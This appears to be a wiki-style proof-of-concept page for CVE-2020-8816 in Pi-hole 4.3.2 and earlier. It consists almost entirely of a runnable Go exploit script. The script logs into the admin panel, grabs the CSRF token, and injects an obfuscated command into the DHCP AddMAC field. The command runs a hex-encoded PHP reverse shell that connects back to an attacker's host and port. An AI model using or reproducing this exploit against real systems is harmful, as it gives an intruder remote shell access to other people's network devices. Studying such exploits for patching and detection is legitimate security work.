<languages />

影响版本
--------

Pi-hole \<= 4.3.2

POC
---

    go run CVE-2020-8816.go -host $LHOST -p $LPORT -pass admin -u http://target/admin/

    package main


    import (
       "flag"
       "log"
       "strings"
       "github.com/anaskhan96/soup"
       "encoding/hex"
       "github.com/levigross/grequests"
    )

    type Options struct {
       url, password, host, port string

    }


    var HOST string
    var URL string
    var PORT string
    var PASSWD string

    func generate_shell() string{
       payload := "php -r '$sock=fsockopen(\"HOST\", PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
       payload = strings.Replace(payload, "HOST", HOST, 1)
       payload = strings.Replace(payload, "PORT", PORT, 1)
       return hex.EncodeToString([]byte(payload))
    }

    func extractFlags() *Options {
       urlPtr := flag.String("u", "http://10.0.0.1/admin/", "Set the Url of the admin panel")
       passPtr := flag.String("pass", "admin", "Admin Password")
       hostPtr := flag.String("host", "10.0.0.1", "Set the host for the reverse shell")
       portPtr := flag.String("p", "1337", "Set Port for the reverse shell")
       flag.Parse()

       return &Options{*urlPtr, *passPtr, *hostPtr,*portPtr}
    }

    func doLogin(ses *grequests.Session) *grequests.Session{
       log.Println("Logging In...")
       resp, err := ses.Post(URL+"index.php",&grequests.RequestOptions{Data: map[string]string{"pw": PASSWD}})
       if err != nil {
           log.Fatal("Error logging-in: ", err)
       }

       if resp.Ok != true {
           log.Println("Request for log-in did not return OK")
       }
       log.Println("Logged In!")
       return ses
    }

    func getToken(ses *grequests.Session) string{
       resp, err:= ses.Get(URL+"index.php",nil)
           if err != nil {
           log.Fatal("Error getting token: ", err)
       }

       if resp.Ok != true {
           log.Println("Request for getting token did not return OK")
       }
       html := soup.HTMLParse(resp.String())
       token := html.Find("div","id","token").Text()
       return token
    }

    func Exploit(ses *grequests.Session, token string, payload string) {
       full_payload := "aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN(\"" + payload + "\"));'&&"
       resp,err := ses.Post(URL + "settings.php", &grequests.RequestOptions{Data: map[string]string{
           "AddMAC":full_payload,
           "field":"DHCP",
           "AddIP":"10.10.10.10",
           "AddHostname":"10.10.10.10",
           "addstatic":"",
           "token":token}})
               if err != nil {
           log.Fatal("Error sending payload: ", err)
       }

       if resp.Ok != true {
           log.Println("Request for sending payload did not return OK")
       }
    }


    func main(){
       options := extractFlags()
       HOST = options.host
       URL = options.url
       PORT = options.port
       PASSWD = options.password
       session := grequests.NewSession(nil)
       doLogin(session)
       log.Println("Getting Token...")
       token := getToken(session)
       log.Println("Token:",token)
       log.Println("Generating payload...")
       payload := generate_shell()
       log.Println("Payload generated:",payload)
       log.Println("Sending exploit...")
       Exploit(session, token, payload)
       log.Println("Exploit executed, check your session")
    }